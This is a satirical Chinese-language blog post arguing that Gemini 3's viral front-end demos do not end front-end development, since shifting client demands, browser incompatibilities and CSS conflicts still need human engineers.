<p>“Gemini 3 真的把前端扬了，这次是骨灰级别的扬。”</p>
<p>“一个 prompt 直接出 3D 体素编辑器/视频剪辑软件/电影级登陆页，前端彻底没活了。”</p>
<p>“我用 Gemini 3 三分钟写了个比 CapCut 还丝滑的网页版剪辑器，程序员可以回家抱孩子了。”</p>
<p>配图永远是那种高潮到发光的 4K 60fps 演示视频：一个 prompt → 进度条走完 → 完美交互应用跃然屏幕，点赞几万，转发狂欢，评论区清一色“前端已死”“我失业了”“时代抛弃你连招呼都不打”。</p>
<p>兄弟们，我太熟这个剧本了。前端这几年，平均每 9 个月就被公开处决一次。</p>
<h4 data-id="heading-0">我们的死亡清单（2025 年 11 月实时更新版）</h4>
<ul>
<li>2010：WordPress 模板 → 前端再卒</li>
<li>2015：Webflow/No-Code → 前端三卒</li>
<li>2023：GPT-4 一个 prompt 贪吃蛇 → 前端四卒</li>
<li>2024：Claude 3.5 Sonnet 卷 UI → 前端五卒</li>
<li>2025 年 11 月 18-21 日：Gemini 3 连发三天 demo（体素玩具箱、网页版 CapCut、赛博风登陆页、AI 视频生成工具……）→ 前端这三天死了 114514 次，目前骨灰已被 X 用户扬到太平洋对岸去了</li>
</ul>
<h4 data-id="heading-1">这几天最经典的几个“葬礼现场”</h4>
<blockquote>
<ol>
<li>那个 3D Voxel Toy Box：一个 prompt 出来，实时绘画、破坏、导出 glTF，丝滑得像 Unity 官方 demo。评论区直接高呼“前端工程师可以集体转行了”。</li>
</ol>
</blockquote>
<blockquote>
<ol start="2">
<li>那个网页版视频编辑器：拖拽时间线、AI 自动生成视频、TTS、字幕、转场全有。作者在 X 上发帖：“从 0 到 1 只用了 1.5 小时，感谢 Gemini 3。” 底下回复“前端已死”“我哭死”“程序员末日”。</li>
</ol>
</blockquote>
<blockquote>
<ol start="3">
<li>那个电影级登陆页：暗黑赛博风、3D 粒子背景、鼠标视差、滚动触发动画，完美响应式，连 iPad 横竖屏切换都丝滑。作者淡定地说：“就一个 prompt，改了三次描述。”</li>
</ol>
</blockquote>
<p>然后这几天，时间线彻底沦陷：</p>
<ul>
<li>“以后公司只需要一个会写 prompt 的产品经理就行了。”</li>
<li>“前端岗位预计 2026 年消失。”</li>
<li>“建议所有大厂立刻裁掉 90% 的前端。”</li>
</ul>
<p><strong>Gemini 3 确实牛逼</strong>，这几天 X 上的各种实测提示词都试了下，生成的东西确实牛逼，我把公司首页丢给它，让它“重构得更现代一点”。
<strong>20秒后，它给我吐了一个电影级粒子背景 + 3D 卡片 + 滚动触发动画的版本，Lighthouse 直接 100/100/100/100。。。奶奶的这比好多优秀前端写的不知道好多少倍。。</strong></p>
<p>但问题来了：你一个 prompt 做出来的完美 demo，明天上线的时候，甲方会告诉你：</p>
<p>“背景要那种看不见的黑色，像深夜emo但又有希望的感觉。”</p>
<p>“这个动画再慢 0.2 秒，用户会觉得我们公司很稳重。”</p>
<p>你问 Gemini 3 怎么改，它会非常认真地给你生成 17 种优雅方案。</p>
<p>然后你上线后发现：</p>
<ul>
<li>甲方不满意，这里那里怎么样怎么样。</li>
<li>甲方的浏览器 CSS 不兼容而导致的样式混乱。</li>
<li>新的样式和项目整体样式冲突。
这时候你还得自己上手，一个个去修、去 hack、去加一堆 !important 和 any。</li>
</ul>
<p>恭喜你，你又回到了最熟悉的前端生活。</p>
<h4 data-id="heading-2">2026 年的新工种：AI 擦屁股工程师</h4>
<p>这几天网上最热门的梗就是“前端已死”，但是只要甲方存在，前端同仁就有活路。</p>
<p>所以，面对这几天铺天盖地的“Gemini 3 把前端扬了”言论，请各位前端同仁保持冷静。我们<strong>前端的真正核心竞争力，从来不是写代码</strong>。</p>
<p><strong>只要甲方会半夜改需求，只要还有安卓碎片化，只要 CSS 还存在，前端就死不了。</strong></p>
<p><strong>前端已死？不，前端只是又被扬了一次骨灰，然后继续负伤加班，顺便帮 Gemini 3 擦屁股。</strong></p>
<p><strong>前端万岁！（下次 GPT-6 出来再继续死）</strong></p>
<h4 data-id="heading-3">首发地址：</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fd_hh8qKdTkW8iBYux2yrVA" target="_blank" title="https://mp.weixin.qq.com/s/d_hh8qKdTkW8iBYux2yrVA" ref="nofollow noopener noreferrer">Gemini 3 发布了，恭喜前端第 10086 次“由于不可抗力”宣告死亡</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>